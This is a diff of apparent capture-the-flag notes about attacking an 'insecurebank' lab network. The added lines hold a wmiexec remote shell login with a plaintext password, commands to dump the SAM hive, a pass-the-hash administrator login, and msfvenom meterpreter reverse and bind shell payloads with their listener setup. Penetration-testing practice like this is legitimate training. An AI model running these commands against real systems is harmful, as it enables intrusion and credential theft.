@@ -88,9 +88,15 @@ OS:E(R=Y%DFI=N%T=80%CD=Z)
 /usr/share/doc/python-impacket/examples/wmiexec.py
 /usr/share/doc/python-impacket/examples/wmiexec.py
 
-usage: wmiexec.py alice:Elefant15@10.59.4.20
+*** Remote shell
+usage: wmiexec.py  alice:Elefant15@10.59.4.20
+
+/usr/share/doc/python-impacket/examples/wmiexec.py alice:Elefant15@10.59.4.20
 
 *got shell*
+
+~whoami~:
+insecurebank\alice
 
 then dumped SAM and SYSTEM with 
 reg save HKLM\SAM r-sam.hive
@@ -114,11 +120,67 @@ Administrator:500:aad3b435b51404eeaad3b435b51404ee:77e0771814213b2747124b0c0fb30
 
 *** Hash structure, username : something : LM hash : NTLM hash
 
+*** TODO hashid (identify type of hash)
+
+What do we do with the captured admin passwords?
+We could use the admin password on *other workstations* that may have been imaged 
+from the same image.
+
+*** Logging in as administrator
+
+~wmiexec~ also allows us to use Pass the Hash, so we can try to re-login into the administrator account
+
+wmiexec has authentication 
+ - hashes LMHASH:NTHASH
+
+which in my case aad3b435b51404eeaad3b435b51404ee:77e0771814213b2747124b0c0fb30359
+
+./wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:77e0771814213b2747124b0c0fb30359 administrator@10.59.4.20
+
+DOMAIN: insecurebank
+
+we see there are different users - 'bob'
+
+* Challenge 2.5
+
+Store - we want to get credit card data
+
 * Challenge 3
 ** Description
 Edward's SSH key
 
 Find Edward's ssh private key. Flag format: There is a 32-hex key on the DEK-Info line.
+
+Trying to prepare metasploit payload
+
+my local ip is 10.59.4.104
+
++ Reverse shell
+msfvenom --payload windows/meterpreter/reverse_tcp --format exe --encoder x86/shikata_ga_nai -i 5 LHOST=10.59.4.104 LPORT=443 > calc.exe
+
++ Bind shell:
+msfvenom --payload windows/meterpreter/bind_tcp --format exe --encoder x86/shikata_ga_nai -i 5 RHOST=10.59.4.20 LPORT=443 > bind-443.exe
+
+*** TODO msfvenom cheat sheet
+[[https://redteamtutorials.com/2018/10/24/msfvenom-cheatsheet/][msfvenom cheat sheet]]
+
+Try to create reverse shell
+~msfconsole~
+use exploit/multi/handler
+set lhost 10.59.4.104
+set lport 443
+
+Host 10.59.4.14:8080 is running Jenkins 2.125
+
+It should have an information disclosure vulnerability:
+https://www.cybersecurity-help.cz/vdb/SB2018121801
+
+https://jenkins.io/security/advisory/2018-12-05/
+
+** Network map
+.14 - jenkins server
+.13 - 
+
 
 * Challenge 4
 
